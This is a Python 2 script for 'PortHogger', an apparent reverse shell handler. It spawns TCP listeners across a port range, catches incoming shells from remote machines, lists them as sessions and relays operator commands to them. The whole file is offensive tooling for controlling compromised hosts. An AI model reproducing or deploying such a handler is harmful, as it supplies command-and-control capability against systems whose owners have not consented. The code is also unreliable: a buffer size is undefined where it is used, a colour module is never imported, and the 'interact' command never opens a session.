#!/usr/bin/env python

from __future__ import unicode_literals
import socket,threading,subprocess
import collections
import sys
from port_range import PortRange
from prompt_toolkit import PromptSession
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.completion import Completer, Completion, WordCompleter


def stdprompt_help():
    stdhelp = "\nStandard Help Menu"
    print stdhelp
    print "=" * len(stdhelp) + "\n"
    print """
help - Displays the help menu
sessions - Lists the active reverse shell connections
createListener <port-range> - Creates a listener for the specified port(s)
"""
def listener(IP,PORT):
    BUFFER_SIZE = 1024
    TCP_IP = IP
    TCP_PORT = PORT


    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((TCP_IP, TCP_PORT))
    s.listen(1)
    conn, addr = s.accept()
    print '\n[*] Connection Established!', addr
    session_table[addr] = conn

def launch_session(ipaddr):
    conn = session_table[ipaddr]
    while 1:
        data = conn.recv(BUFFER_SIZE)
        if not data: break
        if "\\>" in data:
            cmd = raw_input(data)
            cmd = cmd + "\r\n"
            conn.send(cmd) #echo
        else:
            print data
            
    conn.close()

def isInteger(val):
    try:
        integer = int(val)
        return True
    except ValueError:
        return False

def isValidIP(ip):
    try:
        socket.inet_aton(ip)
    except socket.error:
        print "[!] Error: Invalid IP Address"
        exit()

def prog_banner():
    print "BANNER GOES HERE ->"

def list_sessions():
    sessions_title = "\nReverse Shell Sessions"
    print sessions_title
    print "=" * len(sessions_title) + "\n"
    counter = 1
    for key in session_table:
        print "{0}. {1}".format(counter, key)
        counter += 1

def spawn_listener(portrange):
    try:
        port_range = PortRange(portrange)
        if len(port_range.bounds) < 2:
            print "[*] Creating listener on port {0}".format(str(port_range.bounds[0]))
            thread_table[str(port_range.bounds[0])] = threading.Thread(target=listener, args=[sys.argv[1], port_range.bounds[0]])
            reference = thread_table[str(port_range.bounds[0])]
            reference.daemon = False
            reference.start()
            return True
        else:
            print "[*] Creating listener for ports {0}".format(str(port_range))
            for port in range(port_range.bounds[0], port_range.bounds[1]):
                thread_table[str(port)] = threading.Thread(target=listener, args=[sys.argv[1], port])
                reference = thread_table[str(port)]
                reference.daemon = False
                reference.start()
            return True
    except ValueError:
        print "[!] Error: Invalid port or port range specified"
        return False

def main():
    prog_banner()
    global session_table
    session_table = collections.OrderedDict()
    global thread_table 
    thread_table = dict()
    session = PromptSession()
    options = [
                "createlistener",
                "help",
                "options",
                "sessions"
    ]
    options_completer = WordCompleter(options)
    prompt_str = "PortHogger> "
    try:
        while 1:
            cmd = session.prompt(prompt_str, auto_suggest=AutoSuggestFromHistory(), completer=options_completer, complete_in_thread=True)
            if "sessions" in cmd.lower():
                list_sessions()
            elif ("createlistener" in cmd.lower() or "cl" in cmd.lower()) and len(cmd.split()) > 1:
                if spawn_listener(cmd.split()[1]):
                    prompt_str = "PortHogger(" + Fore.RED + "Listener" + Fore.WHITE + ")>"
                else:
                    print "[!] Failed to create listeners for specified port(s)"
            elif "help" in cmd.lower():
                stdprompt_help()
            elif "interact" in cmd.lower() and len(cmd.split()) > 1 and isInteger(cmd.split()[1]):
                print "[*] interacting with reverse shell on connection {0}".format(session_table.keys()[int(cmd.split()[1])-1])
            elif "exit" in cmd.lower():
                print "[*] Exiting..."
                exit()
    except KeyboardInterrupt:
        print "[*] Closing any remaining connections..."
        for conn in session_table.values():
            if conn is not None:
                conn.close()
        exit()

if __name__ == "__main__":
    if len(sys.argv) == 1 or "--help" in sys.argv[1] or "-h" in sys.argv[1]:
        print "porthogger.py <Server IP>"
        exit()
    elif sys.argv[1]:
        main()
